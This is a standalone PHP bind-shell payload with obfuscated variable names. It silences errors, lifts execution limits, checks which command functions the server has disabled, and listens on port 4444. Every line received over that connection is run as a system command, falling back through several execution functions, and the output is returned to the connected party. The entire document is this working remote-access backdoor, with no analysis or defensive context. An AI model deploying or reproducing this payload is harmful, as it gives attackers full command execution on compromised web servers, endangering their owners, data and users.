    /*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $jzvwv=@ini_get('disable_functions');
      if(!empty($jzvwv)){
        $jzvwv=preg_replace('/[, ]+/', ',', $jzvwv);
        $jzvwv=explode(',', $jzvwv);
        $jzvwv=array_map('trim', $jzvwv);
      }else{
        $jzvwv=array();
      }
      
    $port=4444;

    $scl='socket_create_listen';
    if(is_callable($scl)&&!in_array($scl,$jzvwv)){
      $sock=@$scl($port);
    }else{
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
      $ret=@socket_listen($sock,5);
    }
    $msgsock=@socket_accept($sock);
    @socket_close($sock);

    while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
    {
      $o = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if(FALSE===$c){break;}
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $VtCJSmy='is_callable';
      $sGVcgPU='in_array';
      
      if($VtCJSmy('passthru')and!$sGVcgPU('passthru',$jzvwv)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($VtCJSmy('proc_open')and!$sGVcgPU('proc_open',$jzvwv)){
        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($VtCJSmy('shell_exec')and!$sGVcgPU('shell_exec',$jzvwv)){
        $o=shell_exec($c);
      }else
      if($VtCJSmy('popen')and!$sGVcgPU('popen',$jzvwv)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($VtCJSmy('exec')and!$sGVcgPU('exec',$jzvwv)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($VtCJSmy('system')and!$sGVcgPU('system',$jzvwv)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
      }
      @socket_write($msgsock,$o,strlen($o));
    }
    @socket_close($msgsock);
